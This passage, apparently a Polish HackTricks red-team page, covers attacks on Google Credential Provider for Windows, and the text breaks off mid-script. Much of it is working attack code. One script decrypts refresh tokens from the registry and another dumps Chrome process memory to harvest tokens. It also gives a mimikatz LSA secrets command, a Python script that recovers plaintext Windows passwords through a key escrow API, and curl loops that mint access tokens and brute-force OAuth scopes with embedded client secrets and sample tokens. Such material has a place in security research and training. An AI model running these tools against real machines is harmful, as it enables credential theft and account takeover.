# GWS - Ataki synchronizacji Workspace (GCPW, GCDS, synchronizacja katalog√≥w z AD i EntraID)

{% hint style="success" %}
Ucz siƒô i ƒáwicz Hacking AWS:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Ucz siƒô i ƒáwicz Hacking GCP: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawd≈∫ [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Do≈ÇƒÖcz do** üí¨ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **≈õled≈∫** nas na **Twitterze** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siƒô sztuczkami hackingowymi, przesy≈ÇajƒÖc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori√≥w github.

</details>
{% endhint %}

## GCPW - Google Credential Provider dla Windows

To jest jednolity system logowania, kt√≥ry zapewnia Google Workspace, aby u≈ºytkownicy mogli logowaƒá siƒô na swoich komputerach z systemem Windows, u≈ºywajƒÖc **swoich danych logowania do Workspace**. Ponadto, bƒôdzie to przechowywaƒá tokeny do uzyskania dostƒôpu do Google Workspace w niekt√≥rych miejscach na komputerze.

{% hint style="success" %}
Zauwa≈º, ≈ºe [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) jest w stanie wykryƒá **GCPW**, uzyskaƒá informacje o konfiguracji i **nawet tokeny**.
{% endhint %}

### GCPW - MitM

Gdy u≈ºytkownik uzyskuje dostƒôp do komputera z systemem Windows zsynchronizowanego z Google Workspace za po≈õrednictwem GCPW, bƒôdzie musia≈Ç wype≈Çniƒá standardowy formularz logowania. Ten formularz logowania zwr√≥ci kod OAuth, kt√≥ry komputer wymieni na token od≈õwie≈ºania w ≈ºƒÖdaniu takim jak:

{% code overflow="wrap" %}
```http
POST /oauth2/v4/token HTTP/2
Host: www.googleapis.com
Content-Length: 311
Content-Type: application/x-www-form-urlencoded
[...headers...]

scope=https://www.google.com/accounts/OAuthLogin
&grant_type=authorization_code
&client_id=77185425430.apps.googleusercontent.com
&client_secret=OTJgUOQcT7lO7GsGZq2G4IlT
&code=4/0AVG7fiQ1NKncRzNrrGjY5S02wBWBJxV9kUNSKvB1EnJDCWyDmfZvelqKp0zx8jRGmR7LUw
&device_id=d5c82f70-71ff-48e8-94db-312e64c7354f
&device_type=chrome
```
{% endcode %}

Nowe linie zosta≈Çy dodane, aby poprawiƒá czytelno≈õƒá.

{% hint style="info" %}
Mo≈ºliwe by≈Ço przeprowadzenie ataku MitM, instalujƒÖc `Proxifier` na PC, nadpisujƒÖc binarny plik `utilman.exe` plikiem `cmd.exe` i uruchamiajƒÖc **funkcje u≈Çatwie≈Ñ dostƒôpu** na stronie logowania Windows, co uruchomi **CMD**, z kt√≥rego mo≈ºna **uruchomiƒá i skonfigurowaƒá Proxifier**.\
Nie zapomnij **zablokowaƒá ruchu QUICK UDP** w `Proxifier`, aby zredukowaƒá go do komunikacji TCP, dziƒôki czemu bƒôdziesz m√≥g≈Ç go zobaczyƒá.

Skonfiguruj r√≥wnie≈º w "Us≈Çugi i inni u≈ºytkownicy" obie opcje i zainstaluj certyfikat Burp CA w Windows.
{% endhint %}

Dodatkowo, dodajƒÖc klucze `enable_verbose_logging = 1` i `log_file_path = C:\Public\gcpw.log` w **`HKLM:\SOFTWARE\Google\GCPW`**, mo≈ºliwe jest przechowywanie niekt√≥rych log√≥w.

### GCPW - Odcisk palca

Mo≈ºliwe jest sprawdzenie, czy GCPW jest zainstalowane na urzƒÖdzeniu, sprawdzajƒÖc, czy istnieje nastƒôpujƒÖcy proces lub czy istniejƒÖ nastƒôpujƒÖce klucze rejestru:
```powershell
# Check process gcpw_extension.exe
if (Get-Process -Name "gcpw_extension" -ErrorAction SilentlyContinue) {
Write-Output "The process gcpw_xtension.exe is running."
} else {
Write-Output "The process gcpw_xtension.exe is not running."
}

# Check if HKLM\SOFTWARE\Google\GCPW\Users exists
$gcpwHKLMPath = "HKLM:\SOFTWARE\Google\GCPW\Users"
if (Test-Path $gcpwHKLMPath) {
Write-Output "GCPW is installed: The key $gcpwHKLMPath exists."
} else {
Write-Output "GCPW is not installed: The key $gcpwHKLMPath does not exist."
}

# Check if HKCU\SOFTWARE\Google\Accounts exists
$gcpwHKCUPath = "HKCU:\SOFTWARE\Google\Accounts"
if (Test-Path $gcpwHKCUPath) {
Write-Output "Google Accounts are present: The key $gcpwHKCUPath exists."
} else {
Write-Output "No Google Accounts found: The key $gcpwHKCUPath does not exist."
}
```
W **`HKCU:\SOFTWARE\Google\Accounts`** mo≈ºna uzyskaƒá dostƒôp do adresu e-mail u≈ºytkownika oraz zaszyfrowanego **refresh token**, je≈õli u≈ºytkownik niedawno siƒô zalogowa≈Ç.

W **`HKLM:\SOFTWARE\Google\GCPW\Users`** mo≈ºna znale≈∫ƒá **domeny**, kt√≥re majƒÖ prawo do logowania w kluczu `domains_allowed`, a w podkluczach mo≈ºna znale≈∫ƒá informacje o u≈ºytkowniku, takie jak e-mail, zdjƒôcie, nazwa u≈ºytkownika, czasy ≈ºycia token√≥w, uchwyt tokena...

{% hint style="info" %}
Uchwyt tokena to token, kt√≥ry zaczyna siƒô od `eth.` i z kt√≥rego mo≈ºna wyodrƒôbniƒá pewne informacje za pomocƒÖ zapytania, takiego jak:

{% code overflow="wrap" %}
```bash
curl -s 'https://www.googleapis.com/oauth2/v2/tokeninfo' \
-d 'token_handle=eth.ALh9Bwhhy_aDaRGhv4v81xRNXdt8BDrWYrM2DBv-aZwPdt7U54gp-m_3lEXsweSyUAuN3J-9KqzbDgHBfFzYqVink340uYtWAwxsXZgqFKrRGzmXZcJNVapkUpLVsYZ_F87B5P_iUzTG-sffD4_kkd0SEwZ0hSSgKVuLT-2eCY67qVKxfGvnfmg'
# Example response
{
"audience": "77185425430.apps.googleusercontent.com",
"scope": "https://www.google.com/accounts/OAuthLogin",
"expires_in": 12880152
}
```
{% endcode %}

Mo≈ºliwe jest r√≥wnie≈º znalezienie uchwytu tokena dostƒôpu za pomocƒÖ ≈ºƒÖdania takiego jak:

{% code overflow="wrap" %}
```bash
curl -s 'https://www.googleapis.com/oauth2/v2/tokeninfo' \
-d 'access_token=<access token>'
# Example response
{
"issued_to": "77185425430.apps.googleusercontent.com",
"audience": "77185425430.apps.googleusercontent.com",
"scope": "https://www.google.com/accounts/OAuthLogin",
"expires_in": 1327,
"access_type": "offline",
"token_handle": "eth.ALh9Bwhhy_aDaRGhv4v81xRNXdt8BDrWYrM2DBv-aZwPdt7U54gp-m_3lEXsweSyUAuN3J-9KqzbDgHBfFzYqVink340uYtWAwxsXZgqFKrRGzmXZcJNVapkUpLVsYZ_F87B5P_iUzTG-sffD4_kkd0SEwZ0hSSgKVuLT-2eCY67qVKxfGvnfmg"
}
```
{% endcode %}

Afaik nie jest mo≈ºliwe uzyskanie tokenu od≈õwie≈ºania lub tokenu dostƒôpu z uchwytu tokenu.
{% endhint %}

Ponadto plik **`C:\ProgramData\Google\Credential Provider\Policies\<sid>\PolicyFetchResponse`** jest plikiem json zawierajƒÖcym informacje o r√≥≈ºnych **ustawieniach** takich jak `enableDmEnrollment`, `enableGcpAutoUpdate`, `enableMultiUserLogin` (czy kilku u≈ºytkownik√≥w z Workspace mo≈ºe zalogowaƒá siƒô na komputerze) oraz `validityPeriodDays` (liczba dni, przez kt√≥re u≈ºytkownik nie musi ponownie uwierzytelniaƒá siƒô bezpo≈õrednio w Google).

### GCPW - Tokeny od≈õwie≈ºania rejestru

W rejestrze **`HKCU:\SOFTWARE\Google\Accounts`** mo≈ºe byƒá mo≈ºliwe znalezienie niekt√≥rych kont z **`refresh_token`** zaszyfrowanym wewnƒÖtrz. Metoda **`ProtectedData.Unprotect`** mo≈ºe ≈Çatwo to odszyfrowaƒá.

<details>

<summary>Uzyskaj <strong><code>HKCU:\SOFTWARE\Google\Accounts</code></strong> dane i odszyfruj refresh_tokens</summary>
```powershell
# Import required namespace for decryption
Add-Type -AssemblyName System.Security

# Base registry path
$baseKey = "HKCU:\SOFTWARE\Google\Accounts"

# Function to search and decrypt refresh_token values
function Get-RegistryKeysAndDecryptTokens {
param (
[string]$keyPath
)

# Get all values within the current key
$registryKey = Get-Item -Path $keyPath
$foundToken = $false

# Loop through properties to find refresh_token
foreach ($property in $registryKey.Property) {
if ($property -eq "refresh_token") {
$foundToken = $true
try {
# Get the raw bytes of the refresh_token from the registry
$encryptedTokenBytes = (Get-ItemProperty -Path $keyPath -Name $property).$property

# Decrypt the bytes using ProtectedData.Unprotect
$decryptedTokenBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedTokenBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
$decryptedToken = [System.Text.Encoding]::UTF8.GetString($decryptedTokenBytes)

Write-Output "Path: $keyPath"
Write-Output "Decrypted refresh_token: $decryptedToken"
Write-Output "-----------------------------"
}
catch {
Write-Output "Path: $keyPath"
Write-Output "Failed to decrypt refresh_token: $($_.Exception.Message)"
Write-Output "-----------------------------"
}
}
}

# Recursively process all subkeys
Get-ChildItem -Path $keyPath | ForEach-Object {
Get-RegistryKeysAndDecryptTokens -keyPath $_.PSPath
}
}

# Start the search from the base key
Get-RegistryKeysAndDecryptTokens -keyPath $baseKey
```
</details>

Przyk≈Çad wyj≈õcia:

{% code overflow="wrap" %}
```
Path: Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\SOFTWARE\Google\Accounts\100402336966965820570Decrypted refresh_token: 1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI
```
{% endcode %}

Jak wyja≈õniono w [**tym filmie**](https://www.youtube.com/watch?v=FEQxHRRP\_5I), je≈õli nie znajdziesz tokena w rejestrze, mo≈ºliwe jest zmodyfikowanie warto≈õci (lub usuniƒôcie) z **`HKLM:\SOFTWARE\Google\GCPW\Users\<sid>\th`** i nastƒôpnym razem, gdy u≈ºytkownik uzyska dostƒôp do komputera, bƒôdzie musia≈Ç siƒô ponownie zalogowaƒá, a **token zostanie zapisany w poprzednim rejestrze**.

### GCPW - Tokeny od≈õwie≈ºania dysku

Plik **`%LocalAppData%\Google\Chrome\User Data\Local State`** przechowuje klucz do odszyfrowania **`refresh_tokens`** znajdujƒÖcych siƒô w **profilach Google Chrome** u≈ºytkownika, takich jak:

* `%LocalAppData%\Google\Chrome\User Data\Default\Web Data`
* `%LocalAppData%\Google\Chrome\Profile*\Default\Web Data`

Mo≈ºliwe jest znalezienie pewnego **kodu C#** uzyskujƒÖcego dostƒôp do tych token√≥w w ich odszyfrowanej formie w [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe).

Ponadto, szyfrowanie mo≈ºna znale≈∫ƒá w tym kodzie: [https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L216](https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L216)

Mo≈ºna zaobserwowaƒá, ≈ºe u≈ºywany jest AESGCM, zaszyfrowany token zaczyna siƒô od **wersji** (**`v10`** w tym czasie), nastƒôpnie [**ma 12B nonce**](https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L42), a nastƒôpnie ma **tekst szyfrowany** z ko≈Ñcowym **mac o d≈Çugo≈õci 16B**.

### GCPW - Zrzucanie token√≥w z pamiƒôci proces√≥w

NastƒôpujƒÖcy skrypt mo≈ºe byƒá u≈ºyty do **zrzucenia** ka≈ºdego procesu **Chrome** przy u≈ºyciu `procdump`, wyodrƒôbnienia **ciƒÖg√≥w** i nastƒôpnie **wyszukiwania** ciƒÖg√≥w zwiƒÖzanych z **tokenami dostƒôpu i od≈õwie≈ºania**. Je≈õli Chrome jest po≈ÇƒÖczony z jakƒÖ≈õ stronƒÖ Google, jaki≈õ **proces bƒôdzie przechowywa≈Ç tokeny od≈õwie≈ºania i/lub dostƒôpu w pamiƒôci!**

<details>

<summary>Zrzut proces√≥w Chrome i wyszukiwanie token√≥w</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$chromeProcesses = Get-Process -Name "chrome" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -accepteula -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}

Remove-Item -Path $dumpFolder -Recurse -Force
```
</details>

Pr√≥bowa≈Çem tego samego z `gcpw_extension.exe`, ale nie znalaz≈Ç ≈ºadnego tokena.

Z jakiego≈õ powodu, **niekt√≥re wyodrƒôbnione tokeny dostƒôpu nie bƒôdƒÖ wa≈ºne (chocia≈º niekt√≥re bƒôdƒÖ)**. Pr√≥bowa≈Çem nastƒôpujƒÖcego skryptu, aby usunƒÖƒá znaki jeden po drugim, aby spr√≥bowaƒá uzyskaƒá wa≈ºny token z zrzutu. Nigdy nie pomog≈Ço mi to znale≈∫ƒá wa≈ºnego, ale mo≈ºe bym zgad≈Ç:

<details>

<summary>Sprawd≈∫ token dostƒôpu, usuwajƒÖc znaki jeden po drugim</summary>
```bash
#!/bin/bash

# Define the initial access token
access_token="ya29.a0AcM612wWX6Pe3Pc6ApZYknGs5n66W1Hr1CQvF_L_pIm3uZaXWisWFabzxheYCHErRn28l2UOJuAbMzfn1TUpSKqvYvlhXJpxQsKEtwhYXzN2BZdOQNji0EXfF7po1_0WaxhwqOiE0CFQciiL8uAmkRsoXhq9ekC_S8xLrODZ2yKdDR6gSFULWaiIG-bOCFx3DkbOdbjAk-U4aN1WbglUAJdLZh7DMzSucIIZwKWvBxqqajSAjrdW0mRNVN2IfkcVLPndwj7fQJV2bQaCgYKAbQSAQ4SFQHGX2MiPuU1D-9-YHVzaFlUo_RwXA0277"

# Define the URL for the request
url="https://www.googleapis.com/oauth2/v1/tokeninfo"

# Loop until the token is 20 characters or the response doesn't contain "error_description"
while [ ${#access_token} -gt 20 ]; do
# Make the request and capture the response
response=$(curl -s -H "Content-Type: application/x-www-form-urlencoded" -d "access_token=$access_token" $url)

# Check if the response contains "error_description"
if [[ ! "$response" =~ "error_description" ]]; then
echo "Success: Token is valid"
echo "Final token: $access_token"
echo "Response: $response"
exit 0
fi

# Remove the last character from the token
access_token=${access_token:0:-1}

echo "Token length: ${#access_token}"
done

echo "Error: Token invalid or too short"
```
</details>

### GCPW - Odzyskiwanie has≈Ça w postaci czystego tekstu

Aby wykorzystaƒá GCPW do odzyskania has≈Ça w postaci czystego tekstu, mo≈ºna zrzuciƒá zaszyfrowane has≈Ço z **LSASS** za pomocƒÖ **mimikatz**:
```bash
mimikatz_trunk\x64\mimikatz.exe token::elevate lsadump::secrets exit
```
Nastƒôpnie wyszukaj sekret, taki jak `Chrome-GCPW-<sid>`, jak na obrazku:

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-6044191430395675441-x.jpg" alt=""><figcaption></figcaption></figure>

Nastƒôpnie, z **tokenem dostƒôpu** o zakresie `https://www.google.com/accounts/OAuthLogin`, mo≈ºliwe jest za≈ºƒÖdanie klucza prywatnego do odszyfrowania has≈Ça:

<details>

<summary>Skrypt do uzyskania has≈Ça w postaci czystego tekstu, biorƒÖc pod uwagƒô token dostƒôpu, zaszyfrowane has≈Ço i identyfikator zasobu</summary>
```python
import requests
from base64 import b64decode
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA

def get_decryption_key(access_token, resource_id):
try:
# Request to get the private key
response = requests.get(
f"https://devicepasswordescrowforwindows-pa.googleapis.com/v1/getprivatekey/{resource_id}",
headers={
"Authorization": f"Bearer {access_token}"
}
)

# Check if the response is successful
if response.status_code == 200:
private_key = response.json()["base64PrivateKey"]
# Properly format the RSA private key
private_key = f"-----BEGIN RSA PRIVATE KEY-----\n{private_key.strip()}\n-----END RSA PRIVATE KEY-----"
return private_key
else:
raise ValueError(f"Failed to retrieve private key: {response.text}")

except requests.RequestException as e:
print(f"Error occurred while requesting the private key: {e}")
return None

def decrypt_password(access_token, lsa_secret):
try:
# Obtain the private key using the resource_id
resource_id = lsa_secret["resource_id"]
encrypted_data = b64decode(lsa_secret["encrypted_password"])

private_key_pem = get_decryption_key(access_token, resource_id)
print("Found private key:")
print(private_key_pem)

if private_key_pem is None:
raise ValueError("Unable to retrieve the private key.")

# Load the RSA private key
rsa_key = RSA.import_key(private_key_pem)
key_size = int(rsa_key.size_in_bits() / 8)

# Decrypt the encrypted data
cipher_rsa = PKCS1_OAEP.new(rsa_key)
session_key = cipher_rsa.decrypt(encrypted_data[:key_size])

# Extract the session key and other data from decrypted payload
session_header = session_key[:32]
session_nonce = session_key[32:]
mac = encrypted_data[-16:]

# Decrypt the AES GCM data
aes_cipher = AES.new(session_header, AES.MODE_GCM, nonce=session_nonce)
decrypted_password = aes_cipher.decrypt_and_verify(encrypted_data[key_size:-16], mac)

print("Decrypted Password:", decrypted_password.decode("utf-8"))

except Exception as e:
print(f"Error occurred during decryption: {e}")

# CHANGE THIS INPUT DATA!
access_token = "<acces_token>"
lsa_secret = {
"encrypted_password": "<encrypted-password>",
"resource_id": "<resource-id>"
}

decrypt_password(access_token, lsa_secret)
```
</details>

Mo≈ºliwe jest znalezienie kluczowych komponent√≥w tego w kodzie ≈∫r√≥d≈Çowym Chromium:

* Domeny API: [https://github.com/search?q=repo%3Achromium%2Fchromium%20%22devicepasswordescrowforwindows-pa%22\&type=code](https://github.com/search?q=repo%3Achromium%2Fchromium%20%22devicepasswordescrowforwindows-pa%22\&type=code)
* Punkt ko≈Ñcowy API: [https://github.com/chromium/chromium/blob/21ab65accce03fd01050a096f536ca14c6040454/chrome/credential\_provider/gaiacp/password\_recovery\_manager.cc#L70](https://github.com/chromium/chromium/blob/21ab65accce03fd01050a096f536ca14c6040454/chrome/credential\_provider/gaiacp/password\_recovery\_manager.cc#L70)

### GCPW - Generowanie token√≥w dostƒôpu z token√≥w od≈õwie≈ºajƒÖcych

U≈ºywajƒÖc tokena od≈õwie≈ºajƒÖcego, mo≈ºliwe jest generowanie token√≥w dostƒôpu przy u≈ºyciu go oraz identyfikatora klienta i tajnego klucza klienta okre≈õlonych w nastƒôpujƒÖcym poleceniu:
```bash
curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
https://www.googleapis.com/oauth2/v4/token
```
### GCPW - Zakresy

{% hint style="info" %}
Zauwa≈º, ≈ºe nawet posiadajƒÖc token od≈õwie≈ºajƒÖcy, nie mo≈ºna ≈ºƒÖdaƒá ≈ºadnego zakresu dla tokena dostƒôpu, poniewa≈º mo≈ºna ≈ºƒÖdaƒá tylko **zakres√≥w obs≈Çugiwanych przez aplikacjƒô, w kt√≥rej generujesz token dostƒôpu**.

Ponadto, token od≈õwie≈ºajƒÖcy nie jest wa≈ºny w ka≈ºdej aplikacji.
{% endhint %}

Domy≈õlnie GCPW nie bƒôdzie mia≈Ç dostƒôpu jako u≈ºytkownik do ka≈ºdego mo≈ºliwego zakresu OAuth, wiƒôc u≈ºywajƒÖc poni≈ºszego skryptu mo≈ºemy znale≈∫ƒá zakresy, kt√≥re mo≈ºna wykorzystaƒá z `refresh_token`, aby wygenerowaƒá `access_token`:

<details>

<summary>Skrypt Bash do brutalnego wymuszania zakres√≥w</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

A oto wynik, kt√≥ry otrzyma≈Çem w momencie pisania:
```
Valid scopes:
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
```
Ponadto, sprawdzajƒÖc kod ≈∫r√≥d≈Çowy Chromium, mo≈ºna [**znale≈∫ƒá ten plik**](https://github.com/chromium/chromium/blob/5301790cd7ef97088d4862465822da4cb2d95591/google\_apis/gaia/gaia\_constants.cc#L24), kt√≥ry zawiera **inne zakresy**, kt√≥re mo≈ºna za≈Ço≈ºyƒá, ≈ºe **nie pojawiajƒÖ siƒô w wcze≈õniej brutalnie wymuszonym wykazie**. Dlatego te dodatkowe zakresy mo≈ºna za≈Ço≈ºyƒá:

<details>

<summary>Dodatkowe zakresy</summary>
```
https://www.google.com/accounts/OAuthLogin
https://www.googleapis.com/auth/account.capabilities
https://www.googleapis.com/auth/accounts.programmaticchallenge
https://www.googleapis.com/auth/accounts.reauth
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/aida
https://www.googleapis.com/auth/aidahttps://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/android_checkin
https://www.googleapis.com/auth/any-api
https://www.googleapis.com/auth/assistant-sdk-prototype
https://www.googleapis.com/auth/auditrecording-pa
https://www.googleapis.com/auth/bce.secureconnect
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/cast.backdrop
https://www.googleapis.com/auth/cclog
https://www.googleapis.com/auth/chrome-model-execution
https://www.googleapis.com/auth/chrome-optimization-guide
https://www.googleapis.com/auth/chrome-safe-browsing
https://www.googleapis.com/auth/chromekanonymity
https://www.googleapis.com/auth/chromeosdevicemanagement
https://www.googleapis.com/auth/chromesync
https://www.googleapis.com/auth/chromewebstore.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/cryptauth
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/experimentsandconfigs
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/gcm
https://www.googleapis.com/auth/googlenow
https://www.googleapis.com/auth/googletalk
https://www.googleapis.com/auth/identity.passwords.leak.check
https://www.googleapis.com/auth/ip-protection
https://www.googleapis.com/auth/kid.family.readonly
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/kid.permission
https://www.googleapis.com/auth/kids.parentapproval
https://www.googleapis.com/auth/kids.supervision.setup.child
https://www.googleapis.com/auth/lens
https://www.googleapis.com/auth/music
https://www.googleapis.com/auth/nearbydevices-pa
https://www.googleapis.com/auth/nearbypresence-pa
https://www.googleapis.com/auth/nearbysharing-pa
https://www.googleapis.com/auth/peopleapi.readonly
https://www.googleapis.com/auth/peopleapi.readwrite
https://www.googleapis.com/auth/photos
https://www.googleapis.com/auth/photos.firstparty.readonly
https://www.googleapis.com/auth/photos.image.readonly
https://www.googleapis.com/auth/profile.language.read
https://www.googleapis.com/auth/secureidentity.action
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/supportcontent
https://www.googleapis.com/auth/tachyon
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.googleapis.com/auth/wallet.chrome
```
</details>

Zauwa≈º, ≈ºe najciekawszym z nich jest prawdopodobnie:
```c
// OAuth2 scope for access to all Google APIs.
const char kAnyApiOAuth2Scope[] = "https://www.googleapis.com/auth/any-api";
```
Jednak pr√≥bowa≈Çem u≈ºyƒá tego zakresu, aby uzyskaƒá dostƒôp do gmail lub wylistowaƒá grupy i to nie zadzia≈Ça≈Ço, wiƒôc nie wiem, jak przydatny jest on nadal.

**Uzyskaj token dostƒôpu ze wszystkimi tymi zakresami**:

<details>

<summary>Skrypt Bash do generowania tokena dostƒôpu z refresh_token z wszystkimi zakresami</summary>
```bash
export scope=$(echo "https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
